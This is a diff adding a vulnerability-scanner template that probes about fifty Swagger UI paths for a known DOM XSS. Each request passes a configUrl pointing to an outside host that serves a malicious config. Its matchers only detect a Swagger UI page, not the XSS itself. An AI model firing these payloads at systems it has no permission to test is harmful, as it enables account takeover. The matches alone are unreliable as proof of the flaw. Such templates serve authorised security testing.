@@ -1,0 +1,75 @@
+id: dom-xss-swagger-ui
+info:
+  name: XSS swagger UI dom xss vulnerability
+  author: c0nqr0r,m0x0101
+  severity: medium
+  description: XSS via Swagger UI
+  reference:
+    - https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
+    - https://hackerone.com/reports/1736378
+    - https://github.com/swagger-api/swagger-ui/issues/3847
+  tags: xss,swagger
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/apidocs/?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/apidocs/?Url=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger/swagger-ui.js?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger-ui.js?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger/ui/swagger-ui.js?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger/ui/index?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger/index.html?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger-ui.html?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger/swagger-ui.html?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger-ui.html?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api-docs/swagger.json?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api-docs/swagger.yaml?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api_docs?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger.json?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger.yaml?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger/v1/swagger.json?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger/v1/swagger.yaml?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/index.html?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/docs?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger.json?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger.yaml?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger.yml?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger/index.html?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger/swagger-ui.html?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/api-docs/swagger.json?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/api-docs/swagger.yaml?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger-ui/swagger.json?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger-ui/swagger.yaml?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/apidocs/swagger.json?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/apidocs/swagger.yaml?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger-ui/api-docs?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/api-docs?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/apidocs?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger/static/index.html?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger-resources?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger-resources/restservices/v2/api-docs?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/__swagger__/?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/_swagger_/?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/spec/swagger.json?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/spec/swagger.yaml?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger/ui/index?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/__swagger__/?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/_swagger_/?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/v1/swagger-ui/swagger.json?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/v1/swagger-ui/swagger.yaml?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/swagger-resources/restservices/v2/api-docs?configUrl=https://m0x0101.github.io/lol/test.json"
+      - "{{BaseURL}}/api/swagger_doc.json?configUrl=https://m0x0101.github.io/lol/test.json"
+
+    stop-at-first-match: false
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<div id=\"swagger-ui\"></div>"
+
+          
+      - type: status
+        status:
+          - 200
